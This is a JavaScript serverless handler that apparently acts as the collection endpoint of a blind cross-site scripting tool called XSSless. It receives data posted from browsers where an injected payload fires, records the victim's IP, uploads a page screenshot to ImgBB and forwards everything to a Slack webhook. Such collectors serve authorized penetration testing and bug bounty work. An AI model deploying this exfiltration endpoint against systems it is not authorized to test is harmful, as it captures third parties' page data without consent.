export async function onRequestPost(context) {
  const { request, env } = context;
  const data = await request.json();
  const ip = request.headers.get("cf-connecting-ip") || request.headers.get("x-forwarded-for") || "Unknown";
  data["Remote IP"] = ip;

  let screenshotUrl = "";
  if (env.IMGBB_API_KEY && data["Screenshot"]) {
    const encoded = data["Screenshot"].replace("data:image/png;base64,", "");
    const formData = new FormData();
    formData.append("image", encoded);

    try {
      const imgRes = await fetch(`https://api.imgbb.com/1/upload?key=${env.IMGBB_API_KEY}`, {
        method: "POST",
        body: formData
      });
      if (imgRes.ok) {
        const imgOut = await imgRes.json();
        screenshotUrl = imgOut.data?.url_viewer || "Error parsing ImgBB URL";
      } else {
        screenshotUrl = `ImgBB Error: ${imgRes.status}`;
      }
    } catch (e) {
      screenshotUrl = "Exception: " + e.message;
    }
  }

  // Generate Alert
  let alert = "*XSSless: Blind XSS Alert*\n";
  for (const [k, v] of Object.entries(data)) {
    if (k === "Screenshot") continue;
    const value = (v === "" || v === undefined) ? "```None```" : `\n\`\`\`${v}\`\`\``;
    alert += `*${k}:* ${value}\n`;
  }
  if (screenshotUrl) {
    alert += `*Screenshot URL:* \`${screenshotUrl}\`\n`;
  }

  if (env.SLACK_INCOMING_WEBHOOK) {
    try {
      await fetch(env.SLACK_INCOMING_WEBHOOK, {
        method: "POST",
        body: JSON.stringify({
          username: "XLess",
          text: alert,
          mrkdwn: true
        })
      });
    } catch (e) {
      console.error("Slack alert failed:", e);
    }
  }

  return new Response("ok\n");
}
